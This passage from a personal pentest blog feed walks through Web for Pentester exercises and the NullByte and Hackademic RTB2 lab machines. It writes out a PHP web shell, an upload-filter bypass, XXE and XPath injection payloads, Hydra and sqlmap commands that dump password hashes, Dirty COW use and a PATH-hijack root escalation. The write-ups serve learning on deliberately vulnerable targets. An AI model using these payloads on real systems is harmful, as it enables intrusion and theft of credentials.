<p>The ) closes the name filter, then we introduce an always true condition with the * wildcard, the closing ) matches the  one at the beginning of the filter, and the null byte..well, nullifies the rest of the filter.</p>

<p><img class="center" src="/images/pentest/webpentester/ldap2_sol.png" title="&lsquo;ldap 2&rsquo; &lsquo;ldap filter injection&rsquo;" ></p>

<h3>File Upload</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/upload1.png" title="&lsquo;upload1&rsquo; &lsquo;file upload&rsquo;" ></p>

<p>It looks like we can upload an image and find it in the <code>/upload/images/</code> directory:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);
  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir. $file))
  {
  echo &ldquo;Upload done&rdquo;;
  echo &ldquo;Your file can be found <a href=\"/upload/images/".htmlentities($file)."\">here</a>&rdquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>Obviously, I am thinking about uploading a PHP shell instead. But first, I wanted to see if there is anything already in the images folder, and I wasn&rsquo;t disappointed:</p>

<p><img class="center" src="/images/pentest/webpentester/hacker.png" title="&lsquo;lol&rsquo; &lsquo;haxxor chat&rsquo;" ></p>

<p>Ok, now it&rsquo;s time for the shell. I created a basic PHP shell:</p>

<p><code>php
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></p>

<p>Uploaded it, navigated to it and passed a command:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php?cmd=pwd
/var/www/upload/images
</code></p>

<p><strong>Example 2</strong></p>

<p>Same functionality, but this time the script doesn&rsquo;t allow PHP extensions:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);</p>

<pre><code>if (preg_match('/\.php$/',$file)) {
    DIE("NO PHP");
}
</code></pre>

<p>  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir . $file))
  {
  echo &lsquo;Upload done !&rsquo;;
  echo &lsquo;Your file can be found <a href="http://chousensha.github.io/upload/images/'.htmlentities($file).'">here</a>&rsquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>The code checks that an extension may not end in php. Uploading a .php file followed by a non-existent extension will cause the server to ignore the unknown extension and switch to the next one it knows. I uploaded the same shell as <code>ashell.php.fail</code>:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php.fail?cmd=ls%20/home
user
</code></p>

<h3>XML attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xml1.png" title="&lsquo;xml1&rsquo; &lsquo;xml 1&rsquo;" ></p>

<p>A twist on the previous challenges, this time with the use of XML:</p>

<p><code>php
Hello  
&lt;?php
  $xml=simplexml_load_string($_GET['xml']);
  print_r((string)$xml);
?&gt;
</code></p>

<p>This particular vulnerability revolves around <a href="https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection">XML injection</a>:</p>

<blockquote><p>Custom entities can be defined by including them directly in an optional DOCTYPE and the expanded
value they represent may reference an external resource to be included. It is this capacity of
ordinary XML to carry custom references which can be expanded with the contents of an external
resources that gives rise to an XXE vulnerability.</p></blockquote>

<p>So, I defined the following entity:</p>

<p><code>plain
&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;
</code></p>

<p>This entity can be referenced with <code>&hacker;</code>. Of course, we will need to URL encode it. Here&rsquo;s the URL with the XML injection:</p>

<p><code>plain
192.168.217.138/xml/example1.php?xml=&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;&lt;test&gt;%26hacker%3B&lt;/test&gt;
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml1_inj.png" title="&lsquo;xml1&rsquo; &lsquo;xml injection&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p>Another hello page, but the URL is a bit different: <a href="http://192.168.217.138/xml/example2.php?name=hacker">http://192.168.217.138/xml/example2.php?name=hacker</a></p>

<p>``` php
  $x = &ldquo;<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>&rdquo;;</p>

<p>  $xml=simplexml_load_string($x);
  $xpath = &ldquo;users/user/name[.=&lsquo;&rdquo;.$_GET['name&rsquo;].&ldquo;&lsquo;]/parent::*/message&rdquo;;
  $res = ($xml->xpath($xpath));
  while(list( ,$node) = each($res)) {</p>

<pre><code>echo $node;
</code></pre>

<p>  }
```</p>

<p>We see here some XML data containing users and passwords, and user input being used to construct an <a href="https://www.w3schools.com/xml/xml_xpath.asp">XPATH</a> query. XPATH is used to navigate through elements and attributes in an XML document.</p>

<p>With a name of hacker, the XPATH would look like this:</p>

<p><code>plain
users/user/name[.='hacker']/parent::*/message
</code></p>

<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH injection</a> is similar to SQL injection. Here we can inject inside the name input to create an always true condition and get rid of the remaining query as follows: <code>hacker' or 1=1]%00</code>. Now the query looks like this:</p>

<p><code>plain
users/user/name[.='hacker' or 1=1]%00']/parent::*/message
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml2.png" title="&lsquo;xml2&rsquo; &lsquo;xpath injection&rsquo;" ></p>

<p>Wow, this was a really fun challenge, and I hadn&rsquo;t done a web app challenge in a while! Many thanks to PentesterLab for this challenge and their help when I had questions! They also have their own course for the challenge <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a></p>

<p>Until next time, straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ You are fighting for survival in your \
\ own sweet and gentle way.             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
    <updated>2017-04-18T11:00:06-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s' been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>

<!-- more -->


<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>

<p>``` plain
netdiscover -r 192.168.217.0/24</p>

<p> Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> &hellip;          <br/>
 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor            <br/>
 &hellip;<br/>
```</p>

<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>

<p>``` plain
nmap -T4 -p- -sV 192.168.217.135</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-04-18 11:51 EDT
Nmap scan report for 192.168.217.135
Host is up, received arp-response (0.00016s latency).
Not shown: 65531 closed ports
Some closed ports may be reported as filtered due to &mdash;defeat-rst-ratelimit
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```</p>

<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>

<p><img class="center" src="/images/pentest/nullbyte/web.png" title="&lsquo;nullbyte web&rsquo; &lsquo;nullbyte web page&rsquo;" ></p>

<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>

<p>``` plain
gobuster -u <a href="http://192.168.217.135/">http://192.168.217.135/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>Gobuster v1.2                OJ Reeves (@TheColonial)</h1>

<p>[+] Mode         : dir
[+] Url/Domain   : <a href="http://192.168.217.135/">http://192.168.217.135/</a>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>[+] Status codes : 200,204,301,302,307</h1>

<p>/uploads (Status: 301)
/javascript (Status: 301)</p>

<h1>/phpmyadmin (Status: 301)</h1>

<p>```</p>

<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>

<p><code>plain
exiftool main.gif
ExifTool Version Number         : 10.40
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2017:04:18 12:24:59-04:00
File Access Date/Time           : 2017:04:18 12:24:59-04:00
File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
</code></p>

<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>

<p><img class="center" src="/images/pentest/nullbyte/key.png" title="&lsquo;key&rsquo; &lsquo;key form&rsquo;" ></p>

<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>

<p>``` html</p>

<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form>
</center>


<p>```</p>

<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>

<p><code>plain
hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10
</code>
This looks ugly, so let me break it into pieces:</p>

<ul>
<li><p>192.168.217.135 = target name</p></li>
<li><p>http-form-post = the method used</p></li>
<li><p>&ldquo;/kzMb5nVYJw/index.php&rdquo; = URL</p></li>
<li><p>key=^PASS^:invalid key" = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;</p></li>
<li><p>-l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random</p></li>
<li><p>-P /usr/share/dict/words = password File</p></li>
<li><p>-t 10 = number of Threads</p></li>
<li><p>-w 10 = timeout value</p></li>
</ul>


<p>``` plain
Hydra v8.3 &copy; 2016 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-04-18 13:11:54
[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
[DATA] attacking service http-post-form on port 80
[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2017-04-18 13:45:57
```</p>

<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>

<p><img class="center" src="/images/pentest/nullbyte/username.png" title="&lsquo;username&rsquo; &lsquo;search username&rsquo;" ></p>

<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>

<p>``` html</p>

<p>Search for usernames: </p>


<hr>


<p><form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```</p>

<p>Navigating to 420search.php revealed 2 usernames:</p>

<p>``` plain
EMP ID :1
EMP NAME : ramses</p>

<h2>EMP POSITION :</h2>

<p>EMP ID :2
EMP NAME : isis</p>

<h2>EMP POSITION : employee</h2>

<p>Fetched data successfully
```
I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>

<p><code>plain
sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
...
[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
...
Database: seth
[1 table]
+----------------------------------------------+
| users                                        |
+----------------------------------------------+
...
</code></p>

<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>

<p><img class="center" src="/images/pentest/nullbyte/users.png" title="&lsquo;users&rsquo; &lsquo;users csv&rsquo;" ></p>

<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>

<p>``` plain
ssh -p 777 <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#114;&#x61;&#109;&#115;&#101;&#x73;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#x2e;&#50;&#x31;&#55;&#46;&#x31;&#51;&#x35;">&#114;&#x61;&#109;&#x73;&#x65;&#115;&#64;&#x31;&#x39;&#x32;&#46;&#x31;&#x36;&#56;&#46;&#50;&#49;&#x37;&#46;&#x31;&#51;&#x35;</a>
<a href="&#109;&#97;&#105;&#108;&#116;&#111;&#x3a;&#x72;&#x61;&#x6d;&#115;&#x65;&#115;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#x2e;&#x32;&#49;&#x37;&#x2e;&#x31;&#x33;&#53;">&#114;&#97;&#x6d;&#115;&#101;&#x73;&#64;&#x31;&#57;&#x32;&#46;&#49;&#54;&#56;&#46;&#50;&#49;&#x37;&#x2e;&#x31;&#x33;&#53;</a>&rsquo;s password:</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$
```</p>

<p>Time to look around the system!</p>

<p><code>plain
ls -l /home
total 12
drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses
</code></p>

<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>

<p>``` plain
uname -v</p>

<h1>1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</h1>

<p>```</p>

<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>

<p><code>plain
./dirtycow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 53112
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@NullByte:/home/ramses# whoami
root
</code></p>

<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>

<p>``` plain
cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d</p>

<p>It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk &amp; mail at
<a href="&#x6d;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#120;&#108;&#x79;&#x30;&#x6e;&#x40;&#x73;&#105;&#x67;&#97;&#x69;&#x6e;&#x74;&#x2e;&#x6f;&#x72;&#x67;">&#x78;&#x6c;&#x79;&#48;&#110;&#64;&#115;&#x69;&#x67;&#x61;&#105;&#110;&#x74;&#x2e;&#x6f;&#x72;&#103;</a> attach the walk and proof.txt
If sigaint.org is down you may mail at <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#110;&#98;&#x73;&#x6c;&#x79;&#48;&#x6e;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#99;&#x6f;&#x6d;">&#110;&#98;&#115;&#108;&#x79;&#x30;&#110;&#x40;&#103;&#109;&#97;&#105;&#x6c;&#46;&#99;&#x6f;&#x6d;</a></p>

<p>USE THIS PGP PUBLIC KEY</p>

<p>&mdash;&mdash;-BEGIN PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
&mdash;&mdash;-END PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
```</p>

<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>

<p>Inside ramses' home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>

<p><code>plain
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
cd /
ls
exit
</code></p>

<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>

<p><code>plain
ls -l /var/www/backup
total 12
-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
cat readme.txt
I have to fix this mess...
</code></p>

<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>

<p><code>plain
./procwatch
  PID TTY          TIME CMD
 1535 pts/0    00:00:00 procwatch
 1536 pts/0    00:00:00 sh
 1537 pts/0    00:00:00 ps
</code></p>

<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>

<p><code>plain
ps
  PID TTY          TIME CMD
 1555 pts/0    00:00:00 bash
 1605 pts/0    00:00:00 ps
</code></p>

<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>

<blockquote><p>By default, ps selects all processes with the same effective user ID
(euid=EUID) as the current user and associated with the same terminal
as the invoker.</p></blockquote>

<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>

<p><code>plain
cp /bin/sh /tmp/ps
</code></p>

<p>Let&rsquo;s look at the PATH environment variable:</p>

<p><code>plain
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>

<p><code>plain
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Fingers crossed, running procwatch again:</p>

<p>``` plain
ramses@NullByte:/var/www/backup$ ./procwatch</p>

<h1>whoami</h1>

<p>root
```</p>

<p>And we&rsquo;re root..the right way! :D</p>

<p>``` plain
/ You&rsquo;ll wish that you had done some of \
| the hard things when they were easier |
\ to do.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Hackademic RTB2]]></title>
    <link href="http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2/"/>
    <updated>2016-07-20T13:36:20-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/07/20/pentest-lab-hackademic-rtb2</id>
    <content type="html"><![CDATA[<p>The objective is the same as the previous one, get root and read key.txt</p>

<!-- more -->


<h1>Recon</h1>

<p>Again, this will be a web hacking mission, only web server is available.</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-web.png" title="&lsquo;hackademic&rsquo; &lsquo;hackademic website&rsquo;" ></p>

<p>There was nothing in the source code, no suspicious headers, no sql injection in the login. I ran OpenVAS, Dirbuster and Nikto on the target, but nothing more was uncovered other than a Phpmyadmin interface, which kept giving me &ldquo;unable to connect to MySQL server&rdquo; errors no matter what I did. I assumed that maybe the web server is a false front and that might be something else hidden on the machine, so I ran a UDP scan next, which revealed an additional port:</p>

<p><code>plain
nmap -sU -F -n -T4 192.168.80.166
PORT     STATE SERVICE  REASON
5353/udp open  zeroconf udp-response ttl 255
</code></p>

<p>Further internet research and a version scan implied that this was the <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS</a> protocol. I couldn&rsquo;t find anything to exploit it, though. But it made me want to take a closer look at Nmap&rsquo;s results again, so I ran another scan:</p>

<p>``` plain
nmap  -p- 192.168.80.166</p>

<p>Starting Nmap 6.49BETA5 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2016-07-21 08:14 EDT
Nmap scan report for 192.168.80.166
Host is up, received arp-response (0.00024s latency).
Not shown: 65533 closed ports, 1 filtered port
Reason: 65533 resets and 1 port-unreach
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
```</p>

<p>This time I read it more carefully and I noticed it reported a filtered port. I ran Nmap again with the verbose flags and <code>&mdash;packet-trace</code> option and this time it returned a new port:</p>

<p><code>plain
PORT    STATE SERVICE REASON
80/tcp  open  http    syn-ack ttl 64
666/tcp open  doom    syn-ack ttl 64
</code></p>

<p>This must have been the previously reported as filtered port. Version scanning revealed that this was actually another web server!</p>

<p><code>plain
666/tcp open  http    syn-ack ttl 64 Apache httpd 2.2.14 ((Ubuntu))
</code></p>

<p>Before continuing, I am taking a detour here because it seems I had bypassed a secion of the challenge. When I came back to resume working on this VM, I couldn&rsquo;t get the 666 port to open, and I had no idea what triggered it. I looked at g0tmi1lk&rsquo;s video and it turns out there is a SQLi string that you can insert into the password field of the first web server that gives you a different response. The string is <code>&lsquo; or 1=1&mdash;&rsquo;</code>. I previously tested this parameter with sqlmap and also inserting another variation of this string, with no satisfactory answer. I assumed maybe it&rsquo;s hardcoded, because the slightest change, as in putting a space after the comment character invalidates it. Anyway, with this injection attempt you are taken to a page that says &ldquo;Ok, nice shot&hellip;&hellip;but, you are looking in a wrong place bro! ;&ndash;)&rdquo;. In the source, there was a URL encoded string:</p>

<p><code>plain

</code></p>

<p>Decoding it yielded a hex string this time:</p>

<p><code>plain
3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e 0d 0a 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 20 4b 6e 6f 63 6b 69 6e 27 20 6f 6e 20 68 65 61 76 65 6e 27 73 20 64 6f 6f 72 20 2e 2e 20 3a 29 0d 0ad 0a 3c 2d 2d 2d 2d 2d 2d 2d 2d 2d 3e
</code></p>

<p>After decoding the hex string, I got this message:</p>

<p><code>plain
&lt;---------&gt;
Knock Knock Knockin' on heaven's door .. :)
00110001 00110000 00110000 00110001 00111010 00110001 00110001 00110000 00110001 00111010 00110001 00110000 00110001 00110001 00111010 00110001 00110000 00110000 00110001
&lt;---------&gt;
</code></p>

<p>Alright, this is a reference to <a href="https://en.wikipedia.org/wiki/Port_knocking">port knocking</a>. I further decoded the binary data to ascii by using <a href="http://www.snarkles.net/scripts/sneak/sneak.php">this site</a> and got the string <em>1001:1101:1011:1001</em>. So I assumed this string will need to be given to the host in order to open up the port.</p>

<p>``` plain</p>

<h1>!/bin/bash</h1>

<p>for i in 1001 1101 1011 1001
do
nc 192.168.80.167 80 $i
done
```</p>

<p>Indeed, now the 666 port was opened. Not sure how I previously got to it without going through the sequence</p>

<p><img class="center" src="/images/pentest/hackademic/rtb2-hidden.png" title="&lsquo;hidden web server&rsquo; &lsquo;hidden web server&rsquo;" ></p>

<p>Ok, back to hacking! First thing I noticed was a really old Joomla version, so I fired up <code>joomscan</code> and among the 4 vulnerabilities found, I show here one that seemed more interesting:</p>

<p><code>plain
Info -&gt; CorePlugin: TinyMCE TinyBrowser addon multiple vulnerabilities
Versions effected: Joomla! 1.5.12
Check: /plugins/editors/tinymce/jscripts/tiny_mce/plugins/tinybrowser/
Exploit: While Joomla! team announced only File Upload vulnerability, in fact there are many. See: http://www.milw0rm.com/exploits/9296
Vulnerable? Yes
</code></p>

<p>Ok, let&rsquo;s keep this in mind and continue looking. I ran Nikto against this new web server and it reported entries in robots.txt!</p>

<p><code>plain
User-agent: *
Disallow: /administrator/
Disallow: /cache/
Disallow: /components/
Disallow: /images/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /libraries/
Disallow: /media/
Disallow: /modules/
Disallow: /plugins/
Disallow: /templates/
Disallow: /tmp/
Disallow: /xmlrpc/
</code></p>

<h1>Exploit</h1>

<p>I visited those directories but there was nothing interesting. The administrator one contained a message stating that I am not the real administrator. So I went back to testing for SQLi in the login page and in the URL parameters. In particular, I was interested by the <em>Itemid</em> parameter. When I tampered with it, I got messages that I need to login to view that area of the site. I used sqlmap but no vulnerability found. Seeing so many parameters in the URL, I decided to test each one of them by visiting every page and trying a single quote in every parameter. And the jackpot was found at the <code>letter</code> parameter in the List contents page:</p>

<p>``` plain
<a href="http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3">http://192.168.80.166:666/index.php?option=com_abc&amp;view=abc&amp;letter=%27&amp;Itemid=3</a></p>

<p>Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &lsquo;%&rsquo; GROUP BY title ORDER BY title' at line 1 SQL=SELECT id, title FROM jos_content WHERE state = 1 AND UPPER(title) LIKE &lsquo;&rsquo;%&lsquo; GROUP BY title ORDER BY title
&rsquo;
```</p>

<p>With this information, I pointed sqlmap to the vulnerable parameter and retrieved the jos_users table of the joomla database, where among others, there were usernames and password hashes</p>

<p><code>plain
username    usertype    password
Administrator   Super Administrator 08f43b7f40fb0d56f6a8fb0271ec4710:n9RMVci9nqTUog3GjVTNP7IuOrPayqAl
JSmith  Registered  992396d7fc19fd76393f359cb294e300:70NFLkBrApLamH9VNGjlViJLlJsB60KF
BTallor Registered  abe1ae513c16f2a021329cc109071705:FdOrWkL8oMGl1Tju0aT7ReFsOwIMKliy
hacky   Registered  19630caea014ce1746ec41b074973c04:LSGCiJLhUyxZRLOMAcy96PTmbN8nnxIL
</code></p>

